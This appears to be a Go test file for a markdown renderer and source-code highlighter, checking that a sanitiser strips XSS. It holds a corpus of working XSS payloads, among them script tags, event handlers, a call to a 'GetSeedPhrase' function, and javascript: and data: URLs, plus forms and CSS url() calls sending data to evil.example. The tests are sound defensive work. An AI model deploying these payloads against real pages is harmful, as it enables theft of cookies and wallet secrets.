package main

import (
	"bytes"
	"fmt"
	"html"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/alecthomas/chroma/v2/styles"
	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/extension"
	goldmarkhtml "github.com/yuin/goldmark/renderer/html"
)

// ---------------------------------------------------------------------------
// hostile corpus
// ---------------------------------------------------------------------------

// hostilePayload is one attack written as markdown, plus the substring that
// must not survive into the rendered output.
//
// mustNotAppear is chosen so it can only occur in a position that executes.
// "onerror=" cannot appear as escaped text, because escaping turns the tag that
// carries it into &lt;img ...; a bare "javascript:" CAN appear as literal text,
// so those cases assert on the attribute form.
type hostilePayload struct {
	name          string
	markdown      string
	mustNotAppear []string
	// survivesUnsafeRender says this payload is raw HTML that goldmark would
	// pass through if Unsafe were ever enabled. Those get a control assertion
	// proving the payload is live ammunition rather than an inert string.
	survivesUnsafeRender bool
}

var hostileCorpus = []hostilePayload{
	{
		name:                 "script tag",
		markdown:             "# hi\n\n<script>alert(document.cookie)</script>\n",
		mustNotAppear:        []string{"<script", "alert(document.cookie)"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "img onerror",
		markdown:             "<img src=x onerror=\"alert(1)\">\n",
		mustNotAppear:        []string{"onerror="},
		survivesUnsafeRender: true,
	},
	{
		name:                 "svg onload",
		markdown:             "<svg onload=alert(1)></svg>\n",
		mustNotAppear:        []string{"onload=", "<svg"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "body onload via attribute injection",
		markdown:             "<div onclick=\"go.main.App.GetSeedPhrase()\">click</div>\n",
		mustNotAppear:        []string{"onclick=", "GetSeedPhrase"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "iframe",
		markdown:             "<iframe src=\"https://evil.example\"></iframe>\n",
		mustNotAppear:        []string{"<iframe"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "style block",
		markdown:             "<style>body{display:none}</style>\n",
		mustNotAppear:        []string{"<style", "display:none"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "object and embed",
		markdown:             "<object data=\"x\"></object><embed src=\"y\">\n",
		mustNotAppear:        []string{"<object", "<embed"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "form posting elsewhere",
		markdown:             "<form action=\"https://evil.example\"><input name=\"seed\"></form>\n",
		mustNotAppear:        []string{"<form", "<input name"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "meta refresh",
		markdown:             "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">\n",
		mustNotAppear:        []string{"<meta", "http-equiv"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "positioned overlay",
		markdown:             "<span style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;background:red\">x</span>\n",
		mustNotAppear:        []string{"position:fixed", "100vw"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "css url exfiltration",
		markdown:             "<span style=\"background:url(https://evil.example/x)\">x</span>\n",
		mustNotAppear:        []string{"url(https://evil.example"},
		survivesUnsafeRender: true,
	},
	{
		name:          "javascript link",
		markdown:      "[click me](javascript:alert(1))\n",
		mustNotAppear: []string{"href=\"javascript:", "href='javascript:"},
	},
	{
		name:          "javascript link mixed case",
		markdown:      "[click me](JaVaScRiPt:alert(1))\n",
		mustNotAppear: []string{"JaVaScRiPt:alert", "javascript:alert"},
	},
	{
		name:          "vbscript link",
		markdown:      "[click me](vbscript:msgbox(1))\n",
		mustNotAppear: []string{"vbscript:"},
	},
	{
		name:          "data url image",
		markdown:      "![x](data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+)\n",
		mustNotAppear: []string{"data:image/svg", "src=\"data:"},
	},
	{
		name:          "data url link",
		markdown:      "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)\n",
		mustNotAppear: []string{"data:text/html", "href=\"data:"},
	},
	{
		name:          "file url",
		markdown:      "[x](file:///etc/passwd)\n",
		mustNotAppear: []string{"file:///"},
	},
	{
		name:          "autolink javascript",
		markdown:      "<javascript:alert(1)>\n",
		mustNotAppear: []string{"href=\"javascript:"},
	},
	{
		name:          "code fence breaking out",
		markdown:      "```go\n// </code></pre><script>alert(1)</script>\n```\n",
		mustNotAppear: []string{"<script", "</code></pre><script"},
	},
	{
		name:          "code fence with hostile language name",
		markdown:      "```go\"><script>alert(1)</script>\nx\n```\n",
		mustNotAppear: []string{"<script"},
	},
	{
		// The attack is escaping the title attribute to start a new one. The
		// substring "onerror=" alone is NOT the tell: goldmark escapes the
		// quote to &quot;, leaving onerror= sitting inertly inside the title
		// value. Only the quote-bearing form proves a breakout, so that is what
		// is asserted.
		name:          "image title breakout",
		markdown:      "![a](https://e.example/i.png \"\\\" onerror=\\\"alert(1)\")\n",
		mustNotAppear: []string{`" onerror="`},
	},
	{
		name:          "link title breakout",
		markdown:      "[a](https://e.example \"\\\" onmouseover=\\\"alert(1)\")\n",
		mustNotAppear: []string{`" onmouseover="`},
	},
	{
		// Only the TAGS must go. goldmark drops each raw tag and keeps the text
		// between them, so "hidden payload" correctly renders as ordinary prose
		// inside goldmark's own <p>. That is inert - <noscript> matters as an
		// element, not as a string - and asserting the text vanished would be
		// asserting bluemonday's skip-content behaviour on a payload bluemonday
		// never sees.
		name:                 "noscript content smuggling",
		markdown:             "<noscript><p>hidden payload</p></noscript>\n",
		mustNotAppear:        []string{"<noscript", "</noscript"},
		survivesUnsafeRender: true,
	},
	{
		name:                 "base tag hijack",
		markdown:             "<base href=\"https://evil.example/\">\n",
		mustNotAppear:        []string{"<base"},
		survivesUnsafeRender: true,
	},
}

// forbiddenEverywhere are substrings that must never appear in the rendered
// output of the corpus above.
//
// Scoped to the corpus on purpose. The tag names cannot appear escaped, so they
// are unconditionally forbidden. The on*= handlers are different: a README that
// DOCUMENTS HTML inside a code fence legitimately displays that attribute to the
// reader, and TestRenderMarkdownSafe_DocumentedHTMLIsNotAnAttack pins that it
// must. No corpus entry documents HTML, so the strict form is correct here and
// only here.
var forbiddenEverywhere = []string{
	"<script", "</script", "<iframe", "<object", "<embed", "<style",
	"<noscript", "<base", "<meta", "<form",
	"onerror=", "onload=", "onclick=", "onmouseover=", "onfocus=",
}

// ---------------------------------------------------------------------------
// gate 1: goldmark never emits raw HTML
// ---------------------------------------------------------------------------

// unsafeMarkdown is the SAME configuration as telaMarkdown except that raw HTML
// is allowed through and nothing is sanitised. It exists only so the tests can
// prove the hostile corpus is live ammunition: if a payload does not survive
// here, asserting that it is absent from the safe output proves nothing.
var unsafeMarkdown = goldmark.New(
	goldmark.WithExtensions(extension.Strikethrough, extension.TaskList, extension.Linkify),
	goldmark.WithRendererOptions(goldmarkhtml.WithUnsafe()),
)

func renderUnsafe(t *testing.T, src string) string {
	t.Helper()
	var buf bytes.Buffer
	if err := unsafeMarkdown.Convert([]byte(src), &buf); err != nil {
		t.Fatalf("control render failed: %v", err)
	}
	return buf.String()
}

// TestHostileCorpusIsLiveAmmunition proves the raw-HTML payloads really do
// execute-shaped markup when nothing stops them. Without this, every "must not
// appear" assertion below could be passing because the payload was inert.
func TestHostileCorpusIsLiveAmmunition(t *testing.T) {
	checked := 0
	for _, p := range hostileCorpus {
		if !p.survivesUnsafeRender {
			continue
		}
		p := p
		t.Run(p.name, func(t *testing.T) {
			out := renderUnsafe(t, p.markdown)
			for _, bad := range p.mustNotAppear {
				if !strings.Contains(out, bad) {
					t.Fatalf("payload is inert: %q absent even from the UNSAFE render.\nmarkdown: %q\noutput: %q",
						bad, p.markdown, out)
				}
			}
		})
		checked++
	}
	if checked < 10 {
		t.Fatalf("expected at least 10 raw-HTML payloads to control against, got %d", checked)
	}
}

// TestGoldmarkDropsRawHTML pins gate 1 on its own: the configured renderer must
// replace raw HTML with a comment rather than emit it. If someone adds
// html.WithUnsafe() to telaMarkdown, this fails even though bluemonday would
// still be catching it downstream.
func TestGoldmarkDropsRawHTML(t *testing.T) {
	var buf bytes.Buffer
	if err := telaMarkdown.Convert([]byte("<script>alert(1)</script>\n\ntext <b>x</b>\n"), &buf); err != nil {
		t.Fatalf("convert: %v", err)
	}
	raw := buf.String()
	if strings.Contains(raw, "<script") || strings.Contains(raw, "<b>") {
		t.Fatalf("goldmark emitted raw HTML before sanitisation; Unsafe must stay off. got: %q", raw)
	}
	if !strings.Contains(raw, "raw HTML omitted") {
		t.Fatalf("expected goldmark's raw-HTML-omitted marker, got: %q", raw)
	}
}

// ---------------------------------------------------------------------------
// gate 2: the sanitiser, tested directly on raw HTML
// ---------------------------------------------------------------------------

// TestSanitizerNeutralisesRawHostileHTML feeds hostile HTML straight to the
// policy, bypassing goldmark. This is the assertion that gate 2 stands alone.
func TestSanitizerNeutralisesRawHostileHTML(t *testing.T) {
	cases := []struct {
		in            string
		mustNotAppear []string
	}{
		{`<script>alert(1)</script>`, []string{"<script", "alert(1)"}},
		{`<img src=x onerror="alert(1)">`, []string{"onerror"}},
		{`<a href="javascript:alert(1)">x</a>`, []string{"javascript:"}},
		{`<a href="JaVaScRiPt:alert(1)">x</a>`, []string{"aVaScRiPt:", "javascript:"}},
		{`<a href="data:text/html,<script>alert(1)</script>">x</a>`, []string{"data:", "<script"}},
		{`<img src="data:image/svg+xml;base64,PHN2Zz4=">`, []string{"data:"}},
		{`<iframe src="https://evil.example"></iframe>`, []string{"<iframe"}},
		{`<style>body{display:none}</style>`, []string{"<style", "display:none"}},
		{`<noscript>secret</noscript>`, []string{"<noscript", "secret"}},
		{`<span style="position:fixed;width:100vw">x</span>`, []string{"position:fixed"}},
		{`<span style="color:#fff;behavior:url(x.htc)">x</span>`, []string{"behavior"}},
		{`<span style="color:expression(alert(1))">x</span>`, []string{"expression("}},
		{`<span style="background:url(https://evil.example)">x</span>`, []string{"url("}},
		{`<div onclick="alert(1)">x</div>`, []string{"onclick"}},
		{`<input type="text" name="seed">`, []string{"type=\"text\"", "name="}},
		{`<code class="language-go evil">x</code>`, []string{"evil"}},
		{`<a href="/settings">app nav</a>`, []string{"href="}},
		{`<a href="../../etc/passwd">rel</a>`, []string{"href="}},
	}
	for _, c := range cases {
		c := c
		t.Run(c.in, func(t *testing.T) {
			out := telaMarkdownPolicySingleton.Sanitize(c.in)
			for _, bad := range c.mustNotAppear {
				if strings.Contains(out, bad) {
					t.Fatalf("sanitiser kept %q\nin:  %s\nout: %s", bad, c.in, out)
				}
			}
		})
	}
}

// TestChromaStyleRegexIsClosed checks the one attribute the policy admits.
// The regex matches the WHOLE attribute value, so anything outside the
// alternation must fail even when a legal declaration is spliced alongside it.
func TestChromaStyleRegexIsClosed(t *testing.T) {
	allowed := []string{
		"color:#f38ba8",
		"color:#f38ba8;font-weight:bold",
		"color:#f38ba8;font-style:italic",
		"background-color:#1e1e2e",
		"color:#fff",
		"text-decoration:underline",
		"color:#f38ba8;font-weight:bold;font-style:italic;",
	}
	for _, s := range allowed {
		if !chromaStyleRe.MatchString(s) {
			t.Errorf("chroma's own declaration rejected, highlighting would lose colour: %q", s)
		}
	}
	rejected := []string{
		"position:fixed",
		"color:#fff;position:fixed",
		"color:#fff;behavior:url(x)",
		"background:url(https://evil.example)",
		"color:expression(alert(1))",
		"COLOR:#f38ba8",
		"width:100vw",
		"color:#f38ba8 ;position:absolute",
		"color:red",
		"-webkit-text-size-adjust:none",
		"color:#f38ba8;/*x*/position:fixed",
		"color:#gggggg",
		"content:'\\003c script\\003e'",
		"animation-name:x",
		"transform:scale(100)",
		"opacity:0",
	}
	for _, s := range rejected {
		if chromaStyleRe.MatchString(s) {
			t.Errorf("style regex admitted a declaration it must reject: %q", s)
		}
	}
}

// ---------------------------------------------------------------------------
// end to end
// ---------------------------------------------------------------------------

func TestRenderMarkdownSafe_HostileCorpus(t *testing.T) {
	for _, p := range hostileCorpus {
		p := p
		t.Run(p.name, func(t *testing.T) {
			out, err := renderMarkdownSafe(p.markdown)
			if err != nil {
				t.Fatalf("render failed: %v", err)
			}
			for _, bad := range p.mustNotAppear {
				if strings.Contains(out, bad) {
					t.Fatalf("hostile substring %q survived\nmarkdown: %q\noutput:   %q", bad, p.markdown, out)
				}
			}
			for _, bad := range forbiddenEverywhere {
				if strings.Contains(out, bad) {
					t.Fatalf("globally forbidden substring %q survived\nmarkdown: %q\noutput:   %q", bad, p.markdown, out)
				}
			}
		})
	}
}

// TestRenderMarkdownSafe_DocumentedHTMLIsNotAnAttack draws the line the first
// version of the highlighting test got wrong.
//
// A README that documents HTML inside a code fence must still SHOW that HTML to
// the reader. The safety property is that it is escaped text, not that the
// characters are absent - a renderer that deleted them would be broken, not
// safe.
func TestRenderMarkdownSafe_DocumentedHTMLIsNotAnAttack(t *testing.T) {
	out, err := renderMarkdownSafe("Use this:\n\n```html\n<img src=\"a.png\" onerror=\"handler()\">\n```\n")
	if err != nil {
		t.Fatalf("render failed: %v", err)
	}
	// chroma tokenises the attribute name and the "=" separately, so the literal
	// two-character sequence "onerror=" is split across spans. Assert on the
	// name alone rather than on an artefact of tokenisation.
	if !strings.Contains(out, "onerror") {
		t.Fatalf("documented attribute was deleted rather than escaped\ngot: %s", out)
	}
	if !strings.Contains(out, "a.png") {
		t.Fatalf("documented attribute value was dropped\ngot: %s", out)
	}
	// It must be inert: escaped, so no tag is opened.
	if strings.Contains(out, "<img") {
		t.Fatalf("the documented tag was emitted as real markup\ngot: %s", out)
	}
	// Again split across spans: the escaped bracket and the tag name are
	// separate tokens, so assert on the escaped bracket itself.
	if !strings.Contains(out, "&lt;") {
		t.Fatalf("expected the angle bracket to be escaped\ngot: %s", out)
	}
	if !strings.Contains(out, "img") {
		t.Fatalf("expected the tag name to still be visible to the reader\ngot: %s", out)
	}
}

// TestRenderMarkdownSafe_KeepsUsefulMarkup is the counterweight: a sanitiser
// that returns "" always would pass every test above.
func TestRenderMarkdownSafe_KeepsUsefulMarkup(t *testing.T) {
	src := "# Title\n\n" +
		"Some **bold** and _italic_ and ~~struck~~ text.\n\n" +
		"| left | right |\n|:-----|------:|\n| a | b |\n\n" +
		"- [x] done\n- [ ] todo\n\n" +
		"1. one\n2. two\n\n" +
		"> quoted\n\n" +
		"[link](https://example.com) and bare https://example.org\n\n" +
		"`inline code`\n\n" +
		"```go\nfunc main() {}\n```\n"

	out, err := renderMarkdownSafe(src)
	if err != nil {
		t.Fatalf("render failed: %v", err)
	}
	mustAppear := []string{
		"<h1>Title</h1>",
		"<strong>bold</strong>",
		"<em>italic</em>",
		"<del>struck</del>",
		`<th align="left">left</th>`,
		`<th align="right">right</th>`,
		`type="checkbox"`,
		"<blockquote>",
		"<ol>",
		`href="https://example.com"`,
		`rel="nofollow noreferrer noopener"`,
		`target="_blank"`,
		"<code>inline code</code>",
		"<pre>",
	}
	for _, want := range mustAppear {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in output\ngot: %s", want, out)
		}
	}
	if strings.Contains(out, "https://example.org") == false {
		t.Errorf("Linkify dropped the bare URL entirely\ngot: %s", out)
	}
}

// TestRenderMarkdownSafe_HighlightsCodeBlocks pins that highlighting survives
// the sanitiser. If the style regex is tightened past what chroma emits, the
// colours disappear silently and only this test notices.
func TestRenderMarkdownSafe_HighlightsCodeBlocks(t *testing.T) {
	out, err := renderMarkdownSafe("```go\nfunc main() { x := 1 }\n```\n")
	if err != nil {
		t.Fatalf("render failed: %v", err)
	}
	if !strings.Contains(out, `<span style="color:#`) {
		t.Fatalf("no coloured span survived sanitisation, code blocks are unhighlighted\ngot: %s", out)
	}
	if !strings.Contains(out, "func") || !strings.Contains(out, "main") {
		t.Fatalf("code text lost\ngot: %s", out)
	}
	// The chroma <pre> carries -webkit-text-size-adjust and a background; both
	// must be dropped so the app's own <pre> styling wins.
	if strings.Contains(out, "text-size-adjust") {
		t.Errorf("chroma's pre style leaked through\ngot: %s", out)
	}
}

// TestRenderMarkdownSafe_RelativeURLsNeutralised covers the Wails-specific
// hazard: a relative href in the app frame navigates the whole app.
func TestRenderMarkdownSafe_RelativeURLsNeutralised(t *testing.T) {
	out, err := renderMarkdownSafe("![logo](logo.png)\n\n[guide](./guide.md)\n\n[abs](/settings)\n")
	if err != nil {
		t.Fatalf("render failed: %v", err)
	}
	for _, bad := range []string{"logo.png", "guide.md", `href="/settings"`} {
		if strings.Contains(out, bad) {
			t.Errorf("relative URL %q survived\ngot: %s", bad, out)
		}
	}
	// Link text must remain readable even though the anchor is gone.
	for _, want := range []string{"guide", "abs"} {
		if !strings.Contains(out, want) {
			t.Errorf("link text %q was dropped along with the href\ngot: %s", want, out)
		}
	}
}

func TestRenderMarkdownSafe_Limits(t *testing.T) {
	t.Run("too large is rejected not truncated", func(t *testing.T) {
		src := strings.Repeat("a", maxMarkdownBytes+1)
		out, err := renderMarkdownSafe(src)
		if err == nil {
			t.Fatalf("expected an error above the size cap")
		}
		if out != "" {
			t.Fatalf("expected empty output on error, got %d bytes", len(out))
		}
	})
	t.Run("at the cap still renders", func(t *testing.T) {
		src := strings.Repeat("a", maxMarkdownBytes)
		if _, err := renderMarkdownSafe(src); err != nil {
			t.Fatalf("input exactly at the cap should render: %v", err)
		}
	})
	t.Run("binary is rejected", func(t *testing.T) {
		out, err := renderMarkdownSafe("# title\x00\x01\x02 binary")
		if err == nil {
			t.Fatalf("expected an error for binary content")
		}
		if out != "" {
			t.Fatalf("expected empty output, got %q", out)
		}
	})
	t.Run("empty input", func(t *testing.T) {
		out, err := renderMarkdownSafe("")
		if err != nil {
			t.Fatalf("empty input should not error: %v", err)
		}
		if out != "" {
			t.Fatalf("empty input should render empty, got %q", out)
		}
	})
}

// TestRenderMarkdownSafe_Pathological must terminate and must not panic.
func TestRenderMarkdownSafe_Pathological(t *testing.T) {
	cases := map[string]string{
		"deep nesting":         strings.Repeat("> ", 4000) + "x\n",
		"deep emphasis":        strings.Repeat("*", 20000) + "x" + strings.Repeat("*", 20000),
		"deep brackets":        strings.Repeat("[", 20000) + "x" + strings.Repeat("]", 20000),
		"unterminated fence":   "```go\n" + strings.Repeat("x\n", 5000),
		"huge table":           "| a | b |\n|---|---|\n" + strings.Repeat("| 1 | 2 |\n", 10000),
		"many links":           strings.Repeat("[a](https://e.example) ", 10000),
		"nested lists":         strings.Repeat("  ", 500) + "- x\n",
		"long line":            strings.Repeat("word ", 100000),
		"nul free control":     "\x01\x02\x03 control bytes",
		"lone surrogate bytes": "\xed\xa0\x80",
		"backtick storm":       strings.Repeat("`", 50000),
		"html comment storm":   strings.Repeat("<!--", 20000),
	}
	for name, src := range cases {
		name, src := name, src
		t.Run(name, func(t *testing.T) {
			out, err := renderMarkdownSafe(src)
			// Either outcome is acceptable; hanging or panicking is not.
			if err != nil {
				return
			}
			for _, bad := range forbiddenEverywhere {
				if strings.Contains(out, bad) {
					t.Fatalf("forbidden substring %q in pathological output", bad)
				}
			}
		})
	}
}

func TestRenderMarkdownSafe_Concurrent(t *testing.T) {
	var wg sync.WaitGroup
	for i := 0; i < 64; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			src := fmt.Sprintf("# h%d\n\n<script>alert(%d)</script>\n\n```go\nx := %d\n```\n", i, i, i)
			out, err := renderMarkdownSafe(src)
			if err != nil {
				t.Errorf("render %d failed: %v", i, err)
				return
			}
			if strings.Contains(out, "<script") {
				t.Errorf("render %d leaked a script tag", i)
			}
		}(i)
	}
	wg.Wait()
}

// ---------------------------------------------------------------------------
// highlighting
// ---------------------------------------------------------------------------

// TestHighlightStyleExists pins the swapoff trap: styles.Get returns a fallback
// style for an unknown name rather than nil or an error, so a typo in
// highlightStyleName would silently ship a different theme.
func TestHighlightStyleExists(t *testing.T) {
	if chromaStyle == nil {
		t.Fatal("chromaStyle is nil")
	}
	if chromaStyle.Name != highlightStyleName {
		t.Fatalf("styles.Get(%q) returned %q - the style name is wrong and chroma silently fell back",
			highlightStyleName, chromaStyle.Name)
	}
	if got := styles.Get("definitely-not-a-real-style").Name; got == "definitely-not-a-real-style" {
		t.Fatal("chroma no longer falls back for unknown styles; this test's premise needs revisiting")
	}
}

// chromaSpanRe matches the ONLY markup highlightSource is permitted to emit.
//
// The style attribute is matched loosely on purpose: this regex must not be the
// thing that decides an output is safe. It strips chroma's own tags so the test
// can assert that nothing else in the output opens a tag at all.
var chromaSpanRe = regexp.MustCompile(`</?span(?: style="[^"<>]*")?>`)

// assertOnlyChromaSpans is the core XSS assertion for the file viewer.
//
// A source viewer legitimately DISPLAYS strings like `onerror="alert(1)"` -
// that is the file's own text and the user asked to read it. Asserting those
// substrings are absent would be wrong, and the first version of this test made
// exactly that mistake. The property that actually matters is narrower and
// stronger: after removing chroma's own spans, no "<" may remain, because
// chroma puts every token's text through html.EscapeString. If no unescaped "<"
// survives, nothing in the content can open a tag or an attribute.
func assertOnlyChromaSpans(t *testing.T, html string) {
	t.Helper()
	stripped := chromaSpanRe.ReplaceAllString(html, "")
	if i := strings.IndexByte(stripped, '<'); i >= 0 {
		t.Fatalf("unescaped %q outside chroma's own spans at offset %d\nremainder: %s\nfull html: %s",
			"<", i, stripped, html)
	}
	if strings.Contains(stripped, ">") {
		t.Fatalf("unescaped %q outside chroma's own spans\nremainder: %s\nfull html: %s", ">", stripped, html)
	}
}

func TestHighlightSource_EscapesHostileContent(t *testing.T) {
	payloads := []struct{ filename, content string }{
		{"x.js", `var a = "</span></pre><script>alert(1)</script>";`},
		{"x.js", `var b = '<img src=x onerror="alert(1)">';`},
		{"index.html", `<script>alert(document.cookie)</script>`},
		{"index.html", `<img src=x onerror="go.main.App.GetSeedPhrase()">`},
		{"style.css", `body { background: url("</style><script>alert(1)</script>") }`},
		{"app.json", `{"k": "<script>alert(1)</script>"}`},
		{"README.md", "<script>alert(1)</script>"},
		{"noext", `<script>alert(1)</script>`},
		{"data.wasm", `<script>alert(1)</script>`},
		{"contract.bas", `// <script>alert(1)</script>`},
		{"logo.svg", `<svg onload="alert(1)"></svg>`},
		{"x.ts", "const s = `</span><iframe src=javascript:alert(1)>`;"},
	}
	for _, p := range payloads {
		p := p
		t.Run(p.filename+" "+p.content[:min(24, len(p.content))], func(t *testing.T) {
			r := highlightSource(p.filename, p.content)
			assertOnlyChromaSpans(t, r.HTML)
			for _, bad := range []string{"<script", "</script", "<iframe", "<svg"} {
				if strings.Contains(r.HTML, bad) {
					t.Fatalf("raw %q survived highlighting\ncontent: %s\nhtml:    %s", bad, p.content, r.HTML)
				}
			}
			if strings.Contains(p.content, "<") && !strings.Contains(r.HTML, "&lt;") {
				t.Fatalf("expected an escaped angle bracket in the output\ncontent: %s\nhtml:    %s", p.content, r.HTML)
			}
			// The content must still be READABLE - escaping to nothing would
			// pass every assertion above.
			if p.content != "" && r.HTML == "" {
				t.Fatalf("highlighting produced no output for %q", p.content)
			}
		})
	}
}

// TestHighlightSource_FilenameNeverEntersHTML: the filename comes off chain via
// NameHdr and is fully attacker-controlled. It is a lexer key and nothing else.
func TestHighlightSource_FilenameNeverEntersHTML(t *testing.T) {
	hostile := `<script>alert(1)</script>.js`
	r := highlightSource(hostile, "var x = 1;\n")
	if strings.Contains(r.HTML, "script") || strings.Contains(r.HTML, "alert") {
		t.Fatalf("filename leaked into the rendered HTML: %s", r.HTML)
	}
	if strings.Contains(r.Language, "<") {
		t.Fatalf("language field carries markup: %q", r.Language)
	}
}

func TestHighlightSource_LexerSelection(t *testing.T) {
	cases := map[string]string{
		"index.html":        "HTML",
		"main.js":           "JavaScript",
		"style.css":         "CSS",
		"app.json":          "JSON",
		"logo.svg":          "XML",
		"README.md":         "markdown",
		"thing.ts":          "TypeScript",
		"sub/dir/deep.ts":   "TypeScript",
		"noext":             "plaintext",
		"data.wasm":         "plaintext",
		"js/nested/main.js": "JavaScript",
	}
	for filename, want := range cases {
		filename, want := filename, want
		t.Run(filename, func(t *testing.T) {
			r := highlightSource(filename, "x\n")
			if r.Language != want {
				t.Errorf("language for %q = %q, want %q", filename, r.Language, want)
			}
			if !r.Highlighted {
				t.Errorf("expected %q to be highlighted", filename)
			}
		})
	}
}

func TestHighlightSource_Guards(t *testing.T) {
	t.Run("binary returns nothing", func(t *testing.T) {
		png := "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + strings.Repeat("\x00\xff", 500)
		r := highlightSource("logo.png", png)
		if r.Highlighted {
			t.Fatal("binary content must not be highlighted")
		}
		if r.Reason != "binary" {
			t.Fatalf("reason = %q, want %q", r.Reason, "binary")
		}
		if r.HTML != "" {
			t.Fatalf("binary content must not be dumped into the DOM, got %d bytes", len(r.HTML))
		}
		if r.Bytes != len(png) {
			t.Fatalf("bytes = %d, want %d", r.Bytes, len(png))
		}
	})

	t.Run("invalid utf8 counts as binary", func(t *testing.T) {
		r := highlightSource("x.txt", "valid then \xff\xfe\xfd invalid")
		if r.Reason != "binary" {
			t.Fatalf("reason = %q, want binary", r.Reason)
		}
	})

	t.Run("accented utf8 is not binary", func(t *testing.T) {
		r := highlightSource("x.js", "// café naïve 你好\nvar x = 1;\n")
		if !r.Highlighted {
			t.Fatalf("valid UTF-8 was rejected: reason=%q", r.Reason)
		}
	})

	t.Run("multibyte rune spanning the sniff boundary is not binary", func(t *testing.T) {
		// Place a 3-byte rune so it straddles binarySniffBytes.
		content := strings.Repeat("a", binarySniffBytes-1) + "你好" + strings.Repeat("b", 100)
		if isBinaryContent(content) {
			t.Fatal("a rune split by the sniff boundary was misread as binary")
		}
	})

	t.Run("over the highlight cap falls back to escaped plaintext", func(t *testing.T) {
		content := strings.Repeat("<b>x</b>\n", (maxHighlightBytes/9)+200)
		if len(content) <= maxHighlightBytes {
			t.Fatalf("test setup: content is only %d bytes", len(content))
		}
		r := highlightSource("x.js", content)
		if r.Highlighted {
			t.Fatal("content over the cap must not be highlighted")
		}
		if r.Reason != "too large to highlight" {
			t.Fatalf("reason = %q", r.Reason)
		}
		if strings.Contains(r.HTML, "<b>") {
			t.Fatal("fallback path returned unescaped HTML")
		}
		if !strings.Contains(r.HTML, "&lt;b&gt;") {
			t.Fatal("fallback path did not escape")
		}
	})

	t.Run("over the plaintext cap returns nothing", func(t *testing.T) {
		content := strings.Repeat("a", maxPlaintextBytes+1)
		r := highlightSource("x.js", content)
		if r.HTML != "" {
			t.Fatalf("expected no HTML above the plaintext cap, got %d bytes", len(r.HTML))
		}
		if r.Reason != "too large" {
			t.Fatalf("reason = %q", r.Reason)
		}
		if r.Bytes != len(content) {
			t.Fatalf("bytes = %d, want %d", r.Bytes, len(content))
		}
	})

	t.Run("empty content", func(t *testing.T) {
		r := highlightSource("x.js", "")
		if !r.Highlighted {
			t.Fatalf("empty file should still highlight cleanly: %q", r.Reason)
		}
		if r.Bytes != 0 {
			t.Fatalf("bytes = %d", r.Bytes)
		}
	})
}

func TestIsBinaryContent(t *testing.T) {
	cases := map[string]bool{
		"plain ascii":               false,
		"café 你好":                   false,
		"":                          false,
		"has a \x00 nul":            true,
		"\x89PNG\r\n\x1a\n":         true,
		"invalid \xff\xfe":          true,
		"\t\r\n whitespace only \t": false,
		"emoji \U0001F512 padlock":  false,
	}
	for content, want := range cases {
		if got := isBinaryContent(content); got != want {
			t.Errorf("isBinaryContent(%q) = %v, want %v", content, got, want)
		}
	}
}

func TestHighlightSource_Concurrent(t *testing.T) {
	var wg sync.WaitGroup
	for i := 0; i < 64; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			r := highlightSource("x.js", fmt.Sprintf("var x%d = \"<script>alert(%d)</script>\";\n", i, i))
			if strings.Contains(r.HTML, "<script") {
				t.Errorf("iteration %d leaked a script tag", i)
			}
			if !r.Highlighted {
				t.Errorf("iteration %d was not highlighted: %q", i, r.Reason)
			}
		}(i)
	}
	wg.Wait()
}

// ---------------------------------------------------------------------------
// App wrappers
// ---------------------------------------------------------------------------

func TestAppHighlightSource_ResponseShape(t *testing.T) {
	a := &App{}
	res := a.HighlightSource("x.js", "var a = \"<script>alert(1)</script>\";")
	if res["success"] != true {
		t.Fatalf("success = %v", res["success"])
	}
	htmlOut, ok := res["html"].(string)
	if !ok {
		t.Fatalf("html is %T, want string", res["html"])
	}
	if strings.Contains(htmlOut, "<script") {
		t.Fatalf("wrapper leaked a script tag: %s", htmlOut)
	}
	for _, k := range []string{"success", "html", "lines", "language", "highlighted", "reason", "bytes"} {
		if _, ok := res[k]; !ok {
			t.Errorf("response is missing key %q", k)
		}
	}
	lines, ok := res["lines"].([]string)
	if !ok {
		t.Fatalf("lines is %T, want []string", res["lines"])
	}
	if len(lines) != 1 {
		t.Fatalf("lines = %d entries for a one-line file", len(lines))
	}
	if strings.Contains(lines[0], "<script") {
		t.Fatalf("wrapper leaked a script tag in lines: %s", lines[0])
	}
}

func TestAppRenderTELAMarkdown_ResponseShape(t *testing.T) {
	a := &App{}

	res := a.RenderTELAMarkdown("# hi\n\n<script>alert(1)</script>\n")
	if res["success"] != true {
		t.Fatalf("success = %v (error: %v)", res["success"], res["error"])
	}
	htmlOut, ok := res["html"].(string)
	if !ok {
		t.Fatalf("html is %T, want string", res["html"])
	}
	if strings.Contains(htmlOut, "<script") {
		t.Fatalf("wrapper leaked a script tag: %s", htmlOut)
	}
	if !strings.Contains(htmlOut, "<h1>hi</h1>") {
		t.Fatalf("expected the heading to render: %s", htmlOut)
	}

	bad := a.RenderTELAMarkdown(strings.Repeat("a", maxMarkdownBytes+1))
	if bad["success"] != false {
		t.Fatalf("oversized input should fail, got %v", bad["success"])
	}
	if _, ok := bad["error"].(string); !ok {
		t.Fatalf("failed response must carry an error string, got %v", bad["error"])
	}
	if _, ok := bad["html"]; ok {
		t.Fatalf("failed response must not carry html")
	}
}

// TestRenderMarkdownSafe_TimeBudget pins that a document goldmark cannot parse
// quickly is given up on rather than allowed to hold the caller.
//
// maxMarkdownBytes bounds the wrong thing here: goldmark is quadratic on some
